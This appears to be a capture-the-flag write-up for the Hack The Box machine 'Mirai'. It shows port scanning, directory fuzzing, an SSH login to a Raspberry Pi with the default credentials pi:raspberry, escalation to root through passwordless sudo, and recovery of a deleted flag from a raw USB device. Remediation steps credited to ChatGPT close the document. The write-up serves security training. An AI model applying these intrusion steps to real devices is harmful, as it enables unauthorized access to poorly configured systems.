---
description: >-
  Mirai demonstrates one of the fastest-growing attack vectors in modern times;
  improperly configured IoT devices. Skills Required ● Intermediate knowledge of
  Linux ● Enumerating ports and services ● Ba
---

# Mirai -HTB

## Enumeration

We start with a port scan with `rustscan`

```bash
rustscan -a 10.129.142.79 -b 500 --ulimit 1000 -t 2000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Making sure 'closed' isn't just a state of mind.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 1000.
Open 10.129.142.79:22
Open 10.129.142.79:53
Open 10.129.142.79:80
Open 10.129.142.79:1110
Open 10.129.142.79:32400
Open 10.129.142.79:32469
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-21 10:09 EST
Initiating Ping Scan at 10:09
Scanning 10.129.142.79 [4 ports]
Completed Ping Scan at 10:09, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:09
Completed Parallel DNS resolution of 1 host. at 10:09, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 10:09
Scanning 10.129.142.79 [6 ports]
Discovered open port 53/tcp on 10.129.142.79
Discovered open port 22/tcp on 10.129.142.79
Discovered open port 80/tcp on 10.129.142.79
Discovered open port 32400/tcp on 10.129.142.79
Discovered open port 1110/tcp on 10.129.142.79
Discovered open port 32469/tcp on 10.129.142.79
Completed SYN Stealth Scan at 10:09, 0.09s elapsed (6 total ports)
Nmap scan report for 10.129.142.79
Host is up, received echo-reply ttl 63 (0.069s latency).
Scanned at 2025-02-21 10:09:12 EST for 0s

PORT      STATE SERVICE     REASON
22/tcp    open  ssh         syn-ack ttl 63
53/tcp    open  domain      syn-ack ttl 63
80/tcp    open  http        syn-ack ttl 63
1110/tcp  open  nfsd-status syn-ack ttl 63
32400/tcp open  plex        syn-ack ttl 63
32469/tcp open  unknown     syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
           Raw packets sent: 10 (416B) | Rcvd: 7 (292B)

```

We have found some ports open and we start accessing to the `80`. First, we have a blank page with not data.

Since there wasn't much to get it from this website. We start `enumeration` of directories.

#### FFUF

```bash
C:\usr\share\seclists\Discovery\Web-Content> ffuf -c -w common.txt -u http://10.129.142.79/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.142.79/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [1/4734] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: :: Progress: [40/4734] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors::: Progress: [112/4734] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:: Progress: [174/4734] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:: Progress: [247/4734] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:: Progress: [324/4734] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:: Progress: [398/4734] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors_framework/blazor.webassembly.js [Status: 200, Size: 61, Words: 10, Lines: 2, Duration: 70ms]                                                                       
:: Progress: [442/4734] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:: Progress: [462/4734] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:: Progress: [542/4734] :: Job [1/1] :: 607 req/sec :: Duration: [0:00:01] :: Erroadmin                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 71ms]
:: Progress: [562/4734] 
```

We have found `/admin` directory and it is running a `PI-HOLE` dashboard. !\[\[Pasted image 20250221104353.png]] We some research the `SSH` can be running some default credentials. We first try it on the `login` endpoint with not success. However, the `ssh` has the default credentials.

#### SSH

```bash
C:\home\kali\Downloads> ssh pi@10.129.142.79                          
pi@10.129.142.79's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Feb 21 15:25:02 2025 from 10.10.14.120

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~ $ 
```

**Default credentials**: pi:raspberry

We obtain the `user-flag` and then we start checking for our privileges.

```bash
pi@raspberrypi:~ $ sudo -l 
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
pi@raspberrypi:~ $ 
```

The user is in sudoers able to run anything with not password.

```bash
root@raspberrypi:~# ls
root.txt
root@raspberrypi:~# cat root.txt
I lost my original root.txt! I think I may have a backup on my USB stick...
root@raspberrypi:~# 
```

However, we have found it out the flag is not there and there is a not that probably is on the `usb`

```bash
root@raspberrypi:~# df -h
Filesystem      Size  Used Avail Use% Mounted on
aufs            8.5G  2.8G  5.3G  34% /
tmpfs           100M  4.8M   96M   5% /run
/dev/sda1       1.3G  1.3G     0 100% /lib/live/mount/persistence/sda1
/dev/loop0      1.3G  1.3G     0 100% /lib/live/mount/rootfs/filesystem.squashfs
tmpfs           250M     0  250M   0% /lib/live/mount/overlay
/dev/sda2       8.5G  2.8G  5.3G  34% /lib/live/mount/persistence/sda2
devtmpfs         10M     0   10M   0% /dev
tmpfs           250M  8.0K  250M   1% /dev/shm
tmpfs           5.0M  4.0K  5.0M   1% /run/lock
tmpfs           250M     0  250M   0% /sys/fs/cgroup
tmpfs           250M  8.0K  250M   1% /tmp
/dev/sdb        8.7M   93K  7.9M   2% /media/usbstick
tmpfs            50M     0   50M   0% /run/user/999
tmpfs            50M     0   50M   0% /run/user/1000
root@raspberrypi:~# cd /media/usbstick
root@raspberrypi:/media/usbstick# ls
damnit.txt  lost+found
root@raspberrypi:/media/usbstick# cat damnit.txt 
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
root@raspberrypi:/media/usbstick# 
```

We don't have anything in here either; however, we can check `sudo strings /dev/sdb`

```bash
root@raspberrypi:/media/usbstick# sudo strings /dev/sdb
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
/media/usbstick
2]8^
lost+found
root.txt
damnit.txt
>r &
3d3e483143ff12ec505d026fa13e020b
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
-James
```

**Why could it work?** `/dev/sdb` Is a device file that represents your `USB` stick or another storage medium. Running `strings` on this raw device allows you to directly inspect its data without needing to mount it.

* **Presence of hidden text**\*: even if files on the `USB` stick were deleted, part of the file contents might still be recoverable. `Strings` command can find any `human-readable` text that was part of the files.
* **Why this is not intended**\*: It is a `quick metod` to extract readable text from binary files or raw storage devices is not intended for forensic analysis or proper file recovery.

#### Remediation by chatgpt

To directly address the vulnerabilities regarding **default credentials** and **excessive sudo privileges**, here are precise remediation steps:

#### **1. Change Default Password for the `pi` User**

The `pi` user has a default password `raspberry`, which is a significant security vulnerability.

1.  **Change the `pi` user password** immediately to a strong password:

    bash

    Copy

    `sudo passwd pi`

    Enter a **strong password** for the `pi` user. A good password should be at least 12 characters long and contain a mix of letters (upper and lower case), numbers, and special characters.
2.  **Disable the `pi` user (Optional)**: If the `pi` user is no longer needed, lock the user account:

    bash

    Copy

    `sudo usermod -L pi`

    Alternatively, remove the user completely:

    bash

    Copy

    `sudo userdel -r pi`

***

#### **2. Restrict `sudo` Privileges for the `pi` User**

The `pi` user is able to run any command as root without a password, which poses a severe security risk.

**Modify the sudoers file:**

1.  Edit the `sudoers` file to restrict `pi`'s access:

    bash

    Copy

    `sudo visudo`
2.  Find and modify the line:

    bash

    Copy

    `pi ALL=(ALL) NOPASSWD: ALL`

    Change it to:

    bash

    Copy

    `pi ALL=(ALL) ALL`

    This will require the `pi` user to enter their password whenever using `sudo`.

    If the `pi` user doesn’t need `sudo` access, remove or comment out this line entirely.
